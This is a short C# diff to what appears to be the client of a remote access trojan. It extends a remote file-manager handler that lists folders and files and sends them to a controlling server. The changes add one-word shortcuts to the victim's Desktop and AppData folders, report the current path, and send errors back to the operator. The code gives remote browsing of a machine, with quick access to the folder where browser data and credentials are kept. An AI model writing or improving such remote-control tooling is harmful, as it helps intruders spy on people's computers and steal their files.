@@ -44,11 +44,15 @@ namespace Client.Handle_Packet
         {
             try
             {
+                Debug.WriteLine($"Getting [{path}]");
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "fileManager";
                 msgpack.ForcePathObject("Command").AsString = "getPath";
                 StringBuilder sbFolder = new StringBuilder();
                 StringBuilder sbFile = new StringBuilder();
+
+                if (path == "DESKTOP") path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                if (path == "APPDATA") path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData");
 
                 foreach (string folder in Directory.GetDirectories(path))
                 {
@@ -64,9 +68,14 @@ namespace Client.Handle_Packet
                 }
                 msgpack.ForcePathObject("Folder").AsString = sbFolder.ToString();
                 msgpack.ForcePathObject("File").AsString = sbFile.ToString();
+                msgpack.ForcePathObject("CurrentPath").AsString = path.ToString();
                 ClientSocket.Send(msgpack.Encode2Bytes());
             }
-            catch { }
+            catch (Exception ex)
+            {
+                Debug.WriteLine(ex.Message);
+                Packet.Error(ex.Message);
+            }
         }
 
         private Bitmap GetIcon(string file)
